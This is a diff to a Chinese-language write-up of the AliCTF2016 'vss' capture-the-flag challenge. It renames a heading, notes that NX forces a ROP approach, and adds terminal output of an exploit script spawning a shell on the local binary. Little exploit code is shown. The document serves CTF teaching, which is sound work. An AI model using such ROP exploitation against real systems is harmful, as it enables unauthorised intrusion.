@@ -115,7 +115,7 @@
   到这我们分析完了发生溢出的函数，我们可以写攻击程序了。
 
   
-  # 3.编写攻击程序
+  # 第三步、编写攻击程序
   由于开启了NX，所以我们需要使用ROP技术
 
   首先是确定一下输入的字符串的结构
@@ -409,4 +409,21 @@ vss.send(payload)
 vss.interactive()
 ```
 
-Done.
+# 效果
+```
+root@leaflxh-VM:/workspace/github/WebSecurity/2016/AliCTF2016_vss# python2 attack.py 
+[+] Starting local process './vss': pid 3317
+[*] Switching to interactive mode
+$ whoami
+root
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ ls
+README.md  attack.py  pic  vss
+$ 
+[*] Got EOF while reading in interactive
+$ 
+[*] Process './vss' stopped with exit code -14 (SIGALRM) (pid 3317)
+[*] Got EOF while sending in interactive
+root@leaflxh-VM:/workspace/github/WebSecurity/2016/AliCTF2016_vss# 
+```
